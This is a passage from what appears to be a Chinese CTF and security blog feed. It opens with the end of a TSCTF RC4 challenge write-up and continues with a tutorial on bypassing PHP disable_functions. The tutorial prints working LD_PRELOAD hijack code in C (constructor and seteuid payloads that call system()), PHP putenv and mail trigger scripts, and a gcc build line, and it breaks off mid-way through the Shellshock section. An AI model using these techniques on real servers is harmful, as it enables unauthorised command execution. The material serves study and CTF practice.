class="hljs-number">256</span>):<br>            k = (k - self.state[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span><br>            self.__swap_state(i, k) <span class="hljs-comment">#äº¤æ¢å…ƒç´ </span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prng</span>(<span class="hljs-params">self</span>):</span>  <span class="hljs-comment">#äº§ç”Ÿå¯†é’¥å­—èŠ‚k</span><br>        self.i = (self.i + <span class="hljs-number">1</span>)                   % <span class="hljs-number">256</span><br>        self.j = (self.j + self.state[self.i])  % <span class="hljs-number">256</span><br>        self.k = (self.k + self.state[self.j])  % <span class="hljs-number">256</span><br>        self.__swap_state(self.i, self.j)<br>        self.__swap_state(self.i, self.k)<br><br>        <span class="hljs-keyword">return</span> self.state[(self.state[self.i] + self.state[self.j] + self.state[self.k]) % <span class="hljs-number">256</span>]<br><br></code></pre></div></td></tr></table></figure><p>æˆ‘å¢åŠ äº†ä¸€äº›æ³¨é‡Šï¼Œå†ç™¾åº¦ä¸€ä¸‹Rc4åŸç†å…¶å®å°±èƒ½çœ‹æ‡‚ã€‚ä¹‹åçœ‹mainå‡½æ•°å¯ä»¥å‘ç°è¦æ±‚è¾“å…¥key1å’Œkey2ä¸¤ä¸ªåˆå§‹å¯†é’¥ï¼Œä¹‹ååˆ©ç”¨å¯†é’¥å¯¹åŒä¸€ä¸ªæ˜æ–‡è¿›è¡ŒåŠ å¯†ï¼Œå¦‚æœä¸¤ä¸ªåŠ å¯†åçš„å¯†æ–‡ç›¸åŒå³å¯è¾“å‡ºflagï¼Œé¦–å…ˆçœ‹çœ‹keyçš„ä½œç”¨åœ¨å“ªã€‚å¯ä»¥å‘ç°keyçš„ä½œç”¨å¾ˆå•ä¸€ã€‚<br><img src="https://img-blog.csdnimg.cn/2021052413463085.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰€ä»¥åªéœ€è¦ä¸¤ä¸ªkeyåŠ å¯†ä¸­ordå‡ºæ¥çš„å€¼ä¸€æ ·å°±è¡Œäº†ï¼Œåˆ°è¿™å°±å¾ˆç®€å•äº†ï¼Œç›´æ¥æ„é€ å¦‚ä¸‹ï¼Œä¸¤ä¸ªkeyé•¿åº¦ä¸ä¸€æ ·å°±è¡Œäº†ï¼Œè¿™æ ·ä¸ç®¡æ€ä¹ˆæ ·key[]æ•°ç»„å–å‡ºæ¥çš„æ°¸è¿œæ˜¯ç›¸åŒå­—æ¯ã€‚</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">key1</span> = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br><span class="hljs-attr">key2</span> = aaaaaaaaaaaaaaaaa<br></code></pre></div></td></tr></table></figure><p>ç›´æ¥è¾“æ‹¿flag<br><img src="https://img-blog.csdnimg.cn/20210524135057598.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>TSCTF</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºdisabled_functionçš„ç»•è¿‡</title>
    <link href="/2021/05/17/2021-5-17-%E5%85%B3%E4%BA%8Edisabled_function%E7%9A%84%E7%BB%95%E8%BF%87/"/>
    <url>/2021/05/17/2021-5-17-%E5%85%B3%E4%BA%8Edisabled_function%E7%9A%84%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åšé¢˜é‡åˆ°å…³äºdisabled_functionçš„ç»•è¿‡ï¼Œæœ‰æ—¶é—´æ¥æ€»ç»“ä¸€ä¸‹ï¼Œåšå®¢é¡ºåºå¤§è‡´æ˜¯æŒ‰ç…§ctfhubä¸Šçš„webè¿›é˜¶ä¸­å…³äºdisabled_fuctionæ¨¡å—çš„å­¦ä¹ é¡ºåºã€‚</p><h3 id="ç»•è¿‡æ–¹å¼åˆ†ç±»-å¤§éƒ¨åˆ†éƒ½å¯ä»¥ç”¨èšå‰‘æ’ä»¶ç›´æ¥è¿›è¡Œï¼Œè¿™é‡Œä¸»è¦è®²è®²åŸç†"><a href="#ç»•è¿‡æ–¹å¼åˆ†ç±»-å¤§éƒ¨åˆ†éƒ½å¯ä»¥ç”¨èšå‰‘æ’ä»¶ç›´æ¥è¿›è¡Œï¼Œè¿™é‡Œä¸»è¦è®²è®²åŸç†" class="headerlink" title="ç»•è¿‡æ–¹å¼åˆ†ç±»(å¤§éƒ¨åˆ†éƒ½å¯ä»¥ç”¨èšå‰‘æ’ä»¶ç›´æ¥è¿›è¡Œï¼Œè¿™é‡Œä¸»è¦è®²è®²åŸç†)"></a>ç»•è¿‡æ–¹å¼åˆ†ç±»(å¤§éƒ¨åˆ†éƒ½å¯ä»¥ç”¨èšå‰‘æ’ä»¶ç›´æ¥è¿›è¡Œï¼Œè¿™é‡Œä¸»è¦è®²è®²åŸç†)</h3><h5 id="LD-PRELOADåˆ©ç”¨-soæ–‡ä»¶ç¯å¢ƒå˜é‡åŠ è½½æŒ‡å®šçš„åŠ¨æ€é“¾æ¥åº“ï¼Œä»è€Œè¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„"><a href="#LD-PRELOADåˆ©ç”¨-soæ–‡ä»¶ç¯å¢ƒå˜é‡åŠ è½½æŒ‡å®šçš„åŠ¨æ€é“¾æ¥åº“ï¼Œä»è€Œè¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„" class="headerlink" title="- LD_PRELOADåˆ©ç”¨.soæ–‡ä»¶ç¯å¢ƒå˜é‡åŠ è½½æŒ‡å®šçš„åŠ¨æ€é“¾æ¥åº“ï¼Œä»è€Œè¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„"></a>- LD_PRELOADåˆ©ç”¨.soæ–‡ä»¶ç¯å¢ƒå˜é‡åŠ è½½æŒ‡å®šçš„åŠ¨æ€é“¾æ¥åº“ï¼Œä»è€Œè¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„</h5><h5 id="CVE-2014-6271-Shellshockæ¼æ´-bypass-disable-functions"><a href="#CVE-2014-6271-Shellshockæ¼æ´-bypass-disable-functions" class="headerlink" title="- CVE-2014-6271 Shellshockæ¼æ´ bypass disable_functions"></a>- CVE-2014-6271 Shellshockæ¼æ´ bypass disable_functions</h5><h5 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="- Apache Mod CGI"></a>- Apache Mod CGI</h5><h5 id="æ”»å‡»PHP-FPMç»•è¿‡disable-funciton"><a href="#æ”»å‡»PHP-FPMç»•è¿‡disable-funciton" class="headerlink" title="- æ”»å‡»PHP_FPMç»•è¿‡disable funciton"></a>- æ”»å‡»PHP_FPMç»•è¿‡disable funciton</h5><h5 id="å¯»æ‰¾æœªç¦ç”¨çš„æ¼ç½‘å‡½æ•°ï¼Œå¸¸è§çš„æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰-system-ã€exec-ã€shell-exec-ã€passthru-ï¼Œååƒ»çš„-popen-ã€proc-open-ã€pcntl-exec"><a href="#å¯»æ‰¾æœªç¦ç”¨çš„æ¼ç½‘å‡½æ•°ï¼Œå¸¸è§çš„æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰-system-ã€exec-ã€shell-exec-ã€passthru-ï¼Œååƒ»çš„-popen-ã€proc-open-ã€pcntl-exec" class="headerlink" title="- å¯»æ‰¾æœªç¦ç”¨çš„æ¼ç½‘å‡½æ•°ï¼Œå¸¸è§çš„æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰ system()ã€exec()ã€shell_exec()ã€passthru()ï¼Œååƒ»çš„ popen()ã€proc_open()ã€pcntl_exec()"></a>- å¯»æ‰¾æœªç¦ç”¨çš„æ¼ç½‘å‡½æ•°ï¼Œå¸¸è§çš„æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰ system()ã€exec()ã€shell_exec()ã€passthru()ï¼Œååƒ»çš„ popen()ã€proc_open()ã€pcntl_exec()</h5><h5 id="UAF-é‡Šæ”¾é‡å¼•ç”¨æ¼æ´ï¼Œä¾‹GC-UAFã€Json-Serializer-UAF-æ¼æ´ã€Backtrace-UAFç­‰"><a href="#UAF-é‡Šæ”¾é‡å¼•ç”¨æ¼æ´ï¼Œä¾‹GC-UAFã€Json-Serializer-UAF-æ¼æ´ã€Backtrace-UAFç­‰" class="headerlink" title="- UAF é‡Šæ”¾é‡å¼•ç”¨æ¼æ´ï¼Œä¾‹GC UAFã€Json Serializer UAF æ¼æ´ã€Backtrace UAFç­‰"></a>- UAF é‡Šæ”¾é‡å¼•ç”¨æ¼æ´ï¼Œä¾‹GC UAFã€Json Serializer UAF æ¼æ´ã€Backtrace UAFç­‰</h5><h5 id="COMç»„ä»¶-æ¡ä»¶ï¼šWindowsã€php5-xã€æ”¯æŒCOMç»„ä»¶"><a href="#COMç»„ä»¶-æ¡ä»¶ï¼šWindowsã€php5-xã€æ”¯æŒCOMç»„ä»¶" class="headerlink" title="- COMç»„ä»¶ æ¡ä»¶ï¼šWindowsã€php5.xã€æ”¯æŒCOMç»„ä»¶"></a>- COMç»„ä»¶ æ¡ä»¶ï¼šWindowsã€php5.xã€æ”¯æŒCOMç»„ä»¶</h5><h5 id="FFIæ‰©å±•"><a href="#FFIæ‰©å±•" class="headerlink" title="- FFIæ‰©å±•"></a>- FFIæ‰©å±•</h5><h5 id="iconvç»•è¿‡"><a href="#iconvç»•è¿‡" class="headerlink" title="- iconvç»•è¿‡"></a>- iconvç»•è¿‡</h5><h2 id="å…³äºLD-PRELOAD"><a href="#å…³äºLD-PRELOAD" class="headerlink" title="å…³äºLD_PRELOAD"></a>å…³äºLD_PRELOAD</h2><p>åœ¨å­¦ä¹ LD_PRELOADä¹‹å‰éœ€è¦äº†è§£ä»€ä¹ˆæ˜¯é“¾æ¥ã€‚</p><p>ç¨‹åºçš„é“¾æ¥ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š</p><p>é™æ€é“¾æ¥ï¼šåœ¨ç¨‹åºè¿è¡Œä¹‹å‰å…ˆå°†å„ä¸ªç›®æ ‡æ¨¡å—ä»¥åŠæ‰€éœ€è¦çš„åº“å‡½æ•°é“¾æ¥æˆä¸€ä¸ªå®Œæ•´çš„å¯æ‰§è¡Œç¨‹åºï¼Œä¹‹åä¸å†æ‹†å¼€ã€‚<br>è£…å…¥æ—¶åŠ¨æ€é“¾æ¥ï¼šæºç¨‹åºç¼–è¯‘åæ‰€å¾—åˆ°çš„ä¸€ç»„ç›®æ ‡æ¨¡å—ï¼Œåœ¨è£…å…¥å†…å­˜æ—¶ï¼Œè¾¹è£…å…¥è¾¹é“¾æ¥ã€‚</p><p>è¿è¡Œæ—¶åŠ¨æ€é“¾æ¥ï¼šåŸç¨‹åºç¼–è¯‘åå¾—åˆ°çš„ç›®æ ‡æ¨¡å—ï¼Œåœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­éœ€è¦ç”¨åˆ°æ—¶æ‰å¯¹å®ƒè¿›è¡Œé“¾æ¥ã€‚</p><p>å¯¹äºåŠ¨æ€é“¾æ¥æ¥è¯´ï¼Œéœ€è¦ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œå…¶ä½œç”¨åœ¨äºå½“åŠ¨æ€åº“ä¸­çš„å‡½æ•°å‘ç”Ÿå˜åŒ–å¯¹äºå¯æ‰§è¡Œç¨‹åºæ¥è¯´æ—¶é€æ˜çš„ï¼Œå¯æ‰§è¡Œç¨‹åºæ— éœ€é‡æ–°ç¼–è¯‘ï¼Œæ–¹ä¾¿ç¨‹åºçš„å‘å¸ƒ/ç»´æŠ¤/æ›´æ–°ã€‚ä½†æ˜¯ç”±äºç¨‹åºæ˜¯åœ¨è¿è¡Œæ—¶åŠ¨æ€åŠ è½½ï¼Œè¿™å°±å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå‡å¦‚ç¨‹åºåŠ¨æ€åŠ è½½çš„å‡½æ•°æ˜¯æ¶æ„çš„ï¼Œå°±æœ‰å¯èƒ½å¯¼è‡´disable_functionè¢«ç»•è¿‡ã€‚</p><h4 id="LD-PRELOADçš„ä»‹ç»"><a href="#LD-PRELOADçš„ä»‹ç»" class="headerlink" title="LD_PRELOADçš„ä»‹ç»"></a>LD_PRELOADçš„ä»‹ç»</h4><blockquote><p>åœ¨UNIXçš„åŠ¨æ€é“¾æ¥åº“çš„ä¸–ç•Œä¸­ï¼ŒLD_PRELOADå°±æ˜¯è¿™æ ·ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒå¯ä»¥å½±å“ç¨‹åºçš„è¿è¡Œæ—¶çš„é“¾æ¥ï¼ˆRuntime linkerï¼‰ï¼Œå®ƒå…è®¸ä½ å®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ã€‚è¿™ä¸ªåŠŸèƒ½ä¸»è¦å°±æ˜¯ç”¨æ¥æœ‰é€‰æ‹©æ€§çš„è½½å…¥ä¸åŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸åŒå‡½æ•°ã€‚é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸»ç¨‹åºå’Œå…¶åŠ¨æ€é“¾æ¥åº“çš„ä¸­é—´åŠ è½½åˆ«çš„åŠ¨æ€é“¾æ¥åº“ï¼Œç”šè‡³è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ã€‚ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤åŠŸèƒ½æ¥ä½¿ç”¨è‡ªå·±çš„æˆ–æ˜¯æ›´å¥½çš„å‡½æ•°ï¼ˆæ— éœ€åˆ«äººçš„æºç ï¼‰ï¼Œè€Œå¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¥å‘åˆ«äººçš„ç¨‹åºæ³¨å…¥æ¶æ„ç¨‹åºï¼Œä»è€Œè¾¾åˆ°é‚£ä¸å¯å‘Šäººçš„ç½ªæ¶çš„ç›®çš„ã€‚</p></blockquote><h4 id="å¯¹LD-PRELOADçš„åˆ©ç”¨"><a href="#å¯¹LD-PRELOADçš„åˆ©ç”¨" class="headerlink" title="å¯¹LD_PRELOADçš„åˆ©ç”¨"></a>å¯¹LD_PRELOADçš„åˆ©ç”¨</h4><blockquote><p>å‰æï¼š èƒ½å¤Ÿä¸Šä¼ .soæ–‡ä»¶åˆ°æœåŠ¡å™¨åå°ï¼Œèƒ½å¤Ÿç”¨putenv()ç­‰å‡½æ•°æ§åˆ¶ç›¸åº”çš„ç¯å¢ƒå˜é‡ï¼Œå­˜åœ¨å¯ä»¥æ§åˆ¶PHPå¯åŠ¨å¤–éƒ¨ç¨‹åºçš„å‡½æ•°å¹¶èƒ½æ‰§è¡Œï¼ˆå› ä¸ºæ–°è¿›ç¨‹å¯åŠ¨å°†åŠ è½½LD_PRELOADä¸­çš„.soæ–‡ä»¶ï¼‰ï¼Œæ¯”å¦‚mail()ã€imap_mail()ã€mb_send_mail()å’Œerror_log()ç­‰ã€‚<br>é¦–å…ˆï¼Œæˆ‘ä»¬èƒ½å¤Ÿä¸Šä¼ æ¶æ„.soæ–‡ä»¶ï¼Œ.soæ–‡ä»¶ç”±æ”»å‡»è€…åœ¨æœ¬åœ°ä½¿ç”¨ä¸æœåŠ¡ç«¯ç›¸è¿‘çš„ç³»ç»Ÿç¯å¢ƒè¿›è¡Œç¼–è¯‘ï¼Œè¯¥åº“ä¸­é‡å†™äº†ç›¸å…³ç³»ç»Ÿå‡½æ•°ï¼Œé‡å†™çš„ç³»ç»Ÿå‡½æ•°èƒ½å¤Ÿè¢«PHPä¸­æœªè¢«disable_functionsç¦æ­¢çš„å‡½æ•°æ‰€è°ƒç”¨ã€‚</p></blockquote><p>å½“æˆ‘ä»¬èƒ½å¤Ÿè®¾ç½®ç¯å¢ƒå˜é‡ï¼Œæ¯”å¦‚putenvå‡½æ•°æœªè¢«ç¦æ­¢ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠLD_PRELOADå˜é‡è®¾ç½®ä¸ºæ¶æ„.soæ–‡ä»¶çš„è·¯å¾„ï¼Œåªè¦å¯åŠ¨æ–°çš„è¿›ç¨‹å°±ä¼šåœ¨æ–°è¿›ç¨‹è¿è¡Œå‰ä¼˜å…ˆåŠ è½½è¯¥æ¶æ„.soæ–‡ä»¶ï¼Œç”±æ­¤ï¼Œæ¶æ„ä»£ç å°±è¢«æ³¨å…¥åˆ°ç¨‹åºä¸­</p><h4 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;<br>system(<span class="hljs-string">&quot;touch /var/www/html/success&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">seteuid</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>payload();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å¦‚æœæƒ³åˆ›å»ºä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œå¯ä»¥ä½¿ç”¨ GCC çš„-sharedé€‰é¡¹ã€‚è¾“å…¥æ–‡ä»¶å¯ä»¥æ˜¯æºæ–‡ä»¶ã€æ±‡ç¼–æ–‡ä»¶æˆ–è€…ç›®æ ‡æ–‡ä»¶ã€‚å¦å¤–è¿˜å¾—ç»“åˆ-fPICé€‰é¡¹ã€‚-fPIC é€‰é¡¹ä½œç”¨äºç¼–è¯‘é˜¶æ®µï¼Œå‘Šè¯‰ç¼–è¯‘å™¨äº§ç”Ÿä¸ä½ç½®æ— å…³ä»£ç ï¼ˆPosition-Independent Codeï¼‰ï¼›è¿™æ ·ä¸€æ¥ï¼Œäº§ç”Ÿçš„ä»£ç ä¸­å°±æ²¡æœ‰ç»å¯¹åœ°å€äº†ï¼Œå…¨éƒ¨ä½¿ç”¨ç›¸å¯¹åœ°å€ï¼Œæ‰€ä»¥ä»£ç å¯ä»¥è¢«åŠ è½½å™¨åŠ è½½åˆ°å†…å­˜çš„ä»»æ„ä½ç½®ï¼Œéƒ½å¯ä»¥æ­£ç¡®çš„æ‰§è¡Œã€‚è¿™æ­£æ˜¯å…±äº«åº“æ‰€è¦æ±‚çš„ï¼Œå…±äº«åº“è¢«åŠ è½½æ—¶ï¼Œåœ¨å†…å­˜çš„ä½ç½®ä¸æ˜¯å›ºå®šçš„ã€‚ä½ è¦æ ¹æ®ç›®æ ‡æ¶æ„ç¼–è¯‘æˆä¸åŒç‰ˆæœ¬ï¼Œåœ¨ x64 çš„ç¯å¢ƒä¸­ç¼–è¯‘ï¼Œè‹¥ä¸å¸¦ç¼–è¯‘é€‰é¡¹åˆ™é»˜è®¤ä¸º x64ï¼Œè‹¥è¦ç¼–è¯‘æˆ x86 æ¶æ„éœ€è¦åŠ ä¸Š -m32 é€‰é¡¹ã€‚</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">gcc -shared -fPIC <span class="hljs-keyword">test</span>.c -o test_x64.<span class="hljs-keyword">so</span><br></code></pre></div></td></tr></table></figure><p>ä½¿ç”¨è¯¥å‘½ä»¤å°†.cæ–‡ä»¶ç¼–è¯‘æˆåŠ¨æ€é“¾æ¥åº“.æ–‡ä»¶ï¼Œå¹¶ä¸Šä¼ åˆ°/tmpä¸Šã€‚</p><p>å…¶å®è¿™é‡Œä¹Ÿæœ‰å…¶ä»–å¾ˆå¤šç§ä»£ç ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªé€šç”¨åŒ–çš„ä»£ç ã€‚å›åˆ° LD_PRELOAD æœ¬èº«ï¼Œç³»ç»Ÿé€šè¿‡å®ƒé¢„å…ˆåŠ è½½å…±äº«å¯¹è±¡ï¼Œå¦‚æœèƒ½æ‰¾åˆ°ä¸€ä¸ªæ–¹å¼ï¼Œåœ¨åŠ è½½æ—¶å°±æ‰§è¡Œä»£ç ï¼Œè€Œä¸ç”¨è€ƒè™‘åŠ«æŒæŸä¸€ç³»ç»Ÿå‡½æ•°ï¼Œæ¯”å¦‚geteuidï¼ˆï¼‰ã€‚</p><p>åœ¨GCC æœ‰ä¸ª C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦__attribute__((constructor))ï¼Œå¯ä»¥è®©ç”±å®ƒä¿®é¥°çš„å‡½æ•°åœ¨ main() ä¹‹å‰æ‰§è¡Œï¼Œè‹¥å®ƒå‡ºç°åœ¨å…±äº«å¯¹è±¡ä¸­æ—¶ï¼Œé‚£ä¹ˆä¸€æ—¦å…±äº«å¯¹è±¡è¢«ç³»ç»ŸåŠ è½½ï¼Œç«‹å³å°†æ‰§è¡Œ__attribute__((constructor))ä¿®é¥°çš„å‡½æ•°ã€‚</p><p><strong>attribute</strong>((destructor))ä¸­çš„destructorå‚æ•°è®©ç³»ç»Ÿåœ¨main()å‡½æ•°é€€å‡ºæˆ–è€…è°ƒç”¨äº†exit()ä¹‹å,(è¢«__attribute__((destructor))ä¿®é¥°çš„å‡½æ•°)</p><p>å› æ­¤ï¼Œåªè¦phpä¸­è®¾ç½®äº†LD_PRELOADï¼Œå¹¶æ´¾ç”Ÿäº†æ–°çš„è¿›ç¨‹ï¼Œå°†ä¼šæ‰§è¡ŒLD_PRELOADçš„æ–‡ä»¶ä¸­<br><strong>attribute</strong>((constructor))é‡Œçš„å‡½æ•°</p><p>test3.c</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br>__attribute__((constructor))<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* cmd = getenv(<span class="hljs-string">&quot;CMD&quot;</span>);<br>system(cmd);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>test2.php</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>putenv(<span class="hljs-string">&quot;CMD=ls&quot;</span>);<br>putenv(<span class="hljs-string">&quot;LD_PRELOAD=./test3_x64.so&quot;</span>);<br>error_log(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="å†™å…¥webshell"><a href="#å†™å…¥webshell" class="headerlink" title="å†™å…¥webshell"></a>å†™å…¥webshell</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>putenv(<span class="hljs-string">&quot;LD_PRELOAD=/var/www/html/test_x64.so&quot;</span>);<br>mail(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>error_log(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>å°†phpä»£ç ä¸Šä¼ åˆ°/var/www/html/1.phpï¼Œæ¥ç€è®¿é—®1.phpï¼ŒæŸ¥çœ‹/var/www/htmlä¼šæ–°å»ºä¸€ä¸ªsuccessæ–‡ä»¶ã€‚ç”±æ­¤å³å¯è¾¾åˆ°ç»•è¿‡disable_function<br>å‚è€ƒæ–‡ç« <br><a href="_url"></a><a href="http://www.52bug.cn/hkjs/6888.html">http://www.52bug.cn/hkjs/6888.html</a></p><h2 id="CVE-2014-6271-Shellshockæ¼æ´-bypass-disable-functionsï¼ˆbashç‰ˆæœ¬å°äº4-1ï¼‰"><a href="#CVE-2014-6271-Shellshockæ¼æ´-bypass-disable-functionsï¼ˆbashç‰ˆæœ¬å°äº4-1ï¼‰" class="headerlink" title="CVE-2014-6271 Shellshockæ¼æ´ bypass disable_functionsï¼ˆbashç‰ˆæœ¬å°äº4.1ï¼‰"></a>CVE-2014-6271 Shellshockæ¼æ´ bypass disable_functionsï¼ˆbashç‰ˆæœ¬å°äº4.1ï¼‰</h2><h4 id="ä»‹ç»Shellshockæ¼æ´"><a href="#ä»‹ç»Shellshockæ¼æ´" class="headerlink" title="ä»‹ç»Shellshockæ¼æ´"></a>ä»‹ç»Shellshockæ¼æ´</h4><blockquote><p>ä»€ä¹ˆæ˜¯SHELLSHOCKæ¼æ´<br>Shellshockçš„åŸç†æ˜¯åˆ©ç”¨äº†Bashåœ¨å¯¼å…¥ç¯å¢ƒå˜é‡å‡½æ•°æ—¶å€™çš„æ¼æ´ï¼Œå¯åŠ¨Bashçš„æ—¶å€™ï¼Œå®ƒä¸ä½†ä¼šå¯¼å…¥è¿™ä¸ªå‡½æ•°ï¼Œè€Œä¸”ä¹Ÿä¼šæŠŠå‡½æ•°å®šä¹‰åé¢çš„å‘½ä»¤æ‰§è¡Œã€‚<br>åœ¨æœ‰äº›CGIè„šæœ¬çš„è®¾è®¡ä¸­ï¼Œæ•°æ®æ˜¯é€šè¿‡ç¯å¢ƒå˜é‡æ¥ä¼ é€’çš„ï¼Œè¿™æ ·å°±ç»™äº†æ•°æ®æä¾›è€…åˆ©ç”¨Shellshockæ¼æ´çš„æœºä¼šã€‚<br>ç®€å•æ¥è¯´å°±æ˜¯ç”±äºæœåŠ¡å™¨çš„cgiè„šæœ¬è°ƒç”¨äº†bashå‘½ä»¤ï¼Œç”±äºbashç‰ˆæœ¬è¿‡ä½ï¼Œæ”»å‡»è€…æŠŠæœ‰å®³æ•°æ®å†™å…¥ç¯å¢ƒå˜é‡ï¼Œä¼ åˆ°æœåŠ¡å™¨ç«¯ï¼Œè§¦å‘æœåŠ¡å™¨è¿è¡ŒBashè„šæœ¬ï¼Œå®Œæˆæ”»å‡»ã€‚</p></blockquote><h4 id="æ¼æ´åŸç†åˆ†æ"><a href="#æ¼æ´åŸç†åˆ†æ" class="headerlink" title="æ¼æ´åŸç†åˆ†æ"></a>æ¼æ´åŸç†åˆ†æ</h4><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ¼æ´å½¢æˆçš„åŸå› ã€‚è¿™ä¸ªé—®é¢˜çš„å‘ç”Ÿæ˜¯å› 